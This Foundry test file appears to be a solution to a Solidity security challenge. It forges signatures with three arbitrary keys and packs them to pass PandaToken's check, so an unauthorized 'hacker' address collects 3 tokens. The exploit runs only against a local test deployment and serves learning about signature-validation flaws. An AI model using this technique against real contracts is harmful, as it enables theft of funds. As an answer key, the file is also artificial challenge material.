// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/PandaToken.sol";

contract Hack is Test {
    PandaToken pandatoken;
    address owner = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        vm.prank(owner);
        pandatoken = new PandaToken(400, "PandaToken", "PND");
    }

    function test() public {
        vm.startPrank(hacker);
        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);

        // Objetivo: conseguir 3 tokens en tu balance (hacker)
        // solution
        (v, r, s) = vm.sign(1, hash);
        pandatoken.getTokens(1 ether, abi.encodePacked(uint256(0), r, s, v));
        (v, r, s) = vm.sign(2, hash);
        pandatoken.getTokens(1 ether, abi.encodePacked(uint256(0), r, s, v));
        (v, r, s) = vm.sign(3, hash);
        pandatoken.getTokens(1 ether, abi.encodePacked(uint256(0), r, s, v));


        assertEq(pandatoken.balanceOf(hacker), 3 ether);
    }
}